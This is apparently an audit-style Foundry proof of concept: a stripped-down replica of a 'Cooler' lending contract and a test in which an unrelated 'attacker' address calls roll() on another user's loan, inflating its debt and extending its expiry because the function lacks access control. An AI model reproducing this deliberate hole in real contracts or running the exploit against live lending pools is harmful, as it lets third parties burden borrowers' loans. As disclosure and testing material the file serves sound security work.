contract CoolerFactory { enum Events { Request, Rescind, Clear } function newEvent(uint256, Events) external pure {} }

// Minimal vulnerable replica (only state + functions used by the PoC)
contract Cooler {
    address public owner;
    ERC20 public immutable collateral;
    ERC20 public immutable debt;
    CoolerFactory public immutable factory;
    uint256 private constant decimals = 1e18;

    struct Request { uint256 amount; uint256 interest; uint256 loanToCollateral; uint256 duration; bool active; }
    struct Loan { Request request; uint256 amount; uint256 collateral; uint256 expiry; bool rollable; address lender; }

    Loan[] public loans;

    constructor(address o, ERC20 c, ERC20 d) {
        owner = o; collateral = c; debt = d; factory = CoolerFactory(msg.sender);
    }

    // helper to create a loan for the test
    function createLoanWithParams(
        uint256 reqAmount, uint256 reqInterest, uint256 reqLoanToCollateral, uint256 reqDuration,
        uint256 loanAmount, uint256 loanCollateral, uint256 expiry, bool rollable, address lender
    ) external {
        Request memory req = Request(reqAmount, reqInterest, reqLoanToCollateral, reqDuration, false);
        loans.push(Loan(req, loanAmount, loanCollateral, expiry, rollable, lender));
    }

    function roll (uint256 loanID) external {
        Loan storage loan = loans[loanID];
        Request memory req = loan.request;

        if (block.timestamp > loan.expiry) revert("Default");
        if (!loan.rollable) revert("NotRollable");

        uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;
        uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);

        loan.amount += newDebt;
        loan.expiry += req.duration;
        loan.collateral += newCollateral;

        collateral.transferFrom(msg.sender, address(this), newCollateral);
    }

    function collateralFor(uint256 amount, uint256 loanToCollateral) public pure returns (uint256) {
        return amount * decimals / loanToCollateral;
    }
    function interestFor(uint256 amount, uint256 rate, uint256 duration) public pure returns (uint256) {
        uint256 interest = rate * duration / 365 days;
        return amount * interest / decimals;
    }

    // helper to read values for assertions
    function getLoanValues(uint256 id) external view returns (uint256 amount, uint256 collateralAmt, uint256 expiry) {
        Loan memory l = loans[id];
        return (l.amount, l.collateral, l.expiry);
    }
}

contract CoolerTest is Test {
    Cooler target;
    MockERC20 collateral;
    MockERC20 debt;
    address attacker;

    function setUp() public {
        collateral = new MockERC20();
        debt = new MockERC20();
        CoolerFactory factory = new CoolerFactory();
        target = new Cooler(address(this), ERC20(address(collateral)), ERC20(address(debt)));
        attacker = makeAddr("attacker");

        // create a loan: amount = 100 tokens (18 decimals), rate = 1e18 (100%), duration = 365 days
        uint256 amt = 100e18;
        uint256 rate = 1e18;
        uint256 ltc = 1e18;
        uint256 dur = 365 days;
        uint256 expiry = block.timestamp + 1000;
        // initial loan amount and collateral
        target.createLoanWithParams(amt, rate, ltc, dur, amt, 0, expiry, true, address(0xBEEF));

        // fund attacker with enough collateral to perform roll (newCollateral == amt)
        collateral.mint(attacker, amt * 2);
    }

    function test_attacker_exploits_roll() public {
        // compute expected newCollateral and newDebt
        (, , uint256 oldExpiry) = target.getLoanValues(0);
        uint256 newCollateral = target.collateralFor(100e18, 1e18); // equals 100e18
        uint256 newDebt = target.interestFor(100e18, 1e18, 365 days); // equals 100e18

        // attacker approves the Cooler to pull collateral
        vm.prank(attacker);
        collateral.approve(address(target), newCollateral);

        // attacker calls roll — there is NO access control on roll()
        vm.prank(attacker);
        target.roll(0);

        (uint256 afterAmt, uint256 afterCollat, uint256 afterExpiry) = target.getLoanValues(0);

        assertEq(afterAmt, 100e18 + newDebt); // amount increased by interest
        assertEq(afterCollat, 0 + newCollateral); // collateral increased by computed amount
        assertEq(afterExpiry, oldExpiry + 365 days); // expiry extended by duration
    }
}

